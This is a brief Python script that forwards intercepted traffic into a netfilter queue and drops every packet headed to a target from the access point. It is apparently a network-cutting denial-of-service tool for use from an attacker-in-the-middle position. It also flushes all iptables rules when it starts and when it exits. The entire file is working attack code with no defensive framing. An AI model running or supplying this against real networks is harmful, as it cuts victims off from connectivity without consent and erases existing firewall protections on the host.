#!/usr/bin/env python3

import netfilterqueue
import os

def forward_packets(): # forward packets that are stacked in the queue
    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')

def reset_iptables(): #reset iptables to normal
    os.system('iptables --flush')

def process_packet(packet): #drop all packets coming torwads the target from the ap
    packet.drop()

def accept_packets(packet): #if you want to forward the packets instead of dropping them
    packet.accept()

reset_iptables()
forward_packets()

try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\n\033[1;34;40m[-] Detected CNTL C. RESSETING IPTABLES BACK TO NORMAL......")
    reset_iptables()

